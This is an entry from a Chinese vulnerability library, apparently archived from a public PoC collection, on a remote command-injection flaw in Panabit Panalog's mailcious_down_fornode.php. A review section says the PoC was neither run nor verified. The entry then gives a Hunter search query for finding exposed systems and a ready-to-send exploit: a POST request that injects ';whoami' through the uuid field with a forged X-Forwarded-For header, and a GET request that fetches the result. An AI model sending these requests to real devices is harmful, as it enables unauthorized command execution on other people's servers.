---
source: "wy876 漏洞文库"
id: "vw-aa3c63801095a27cafa5c6cd"
entity_id: "ve-aa3c63801095a27cafa5c6cd"
schema_version: "1"
title: "panabit日志审计系统mailcious_down_fornode远程命令执行漏洞"
product: "Panabit Panalog"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求无cookie，有伪造XFF；版本缺失"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Panabit/panabit%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fmailcious_down_fornode%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qkhnzs3bu0s8zxxn"
source_status: "recorded"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"Panabit 日志系统\""
---

# panabit日志审计系统mailcious_down_fornode远程命令执行漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Panabit Panalog
- 本文讨论：mailcious_down_fornode.php uuid命令注入
- 版本、权限与配置前提：请求无cookie，有伪造XFF；版本缺失
- 资料类型：请求型PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- XFF多地址前提未解释，无法判断是否认证/来源白名单绕过必要条件
- 无文本响应；fofa误录Hunter残缺app.name=
- 无固定版本或厂商来源
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- XFF作用、可达/鉴权及版本待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
panalog为北京派网软件有限公司，一款流量分析，日志分析管理的一款软件。panabit日志审计系统mailcious_down_fornode远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ Panabit panalog

# 三、资产测绘
+ hunter`app.name="Panabit 日志系统"`
+ 特征


# 四、漏洞复现
```http
POST /mailcious_down_fornode.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
Content-Length: 40
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1,192.168.170.105,172.10.107.143

action=check&uuid=;whoami > pobjejsh.txt
```


获取命令执行结果

```http
GET /pobjejsh.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
Connection: close
Content-Type: text/plain
Accept-Encoding: gzip, deflate
```

[panabit-mailcious-down-fornode-远程命令执行.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222233874-8275a922-bf36-45a6-b083-4536ea247db0.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qkhnzs3bu0s8zxxn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
